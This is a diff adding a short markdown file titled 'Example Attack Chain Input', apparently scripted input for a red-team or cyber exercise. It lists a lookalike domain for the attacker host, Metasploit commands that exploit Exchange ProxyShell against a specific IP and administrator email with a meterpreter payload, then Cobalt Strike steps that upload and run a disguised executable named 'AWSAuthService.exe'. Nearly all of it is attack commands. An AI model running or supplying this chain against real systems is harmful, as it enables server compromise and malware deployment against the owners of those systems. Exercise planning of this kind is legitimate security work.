@@ -1,0 +1,18 @@
+Example Attack Chain Input
+
+__Setup__
+* New-is-inet
+   * UDG-KALI-1 == amazonauth.com
+
+__Initial Access__
+* Udg-kali-1 terminal
+   * msfconsole
+   * `use exploit/windows/http/exchange_proxyshell_rce`
+   * `set RHOSTS 195.130.70.5`
+   * `set EMAIL Administrator@mod.gov.gk`
+   * `set payload windows/x64/meterpreter/bind_tcp`
+   * `run`
+   * __using cobaltstrike__> `cd C:\Users\Administrator\Documents`
+   * __using cobaltstrike__> `upload /home/user/Desktop/AWSAuthService.exe C:\Users\Administrator\Documents\AWSAuthService.exe`
+   * __using cobaltstrike__> `execute -f "C:\Users\Administrator\Documents\AWSAuthService.exe"`
+   * __using cobaltstrike__> `exit`
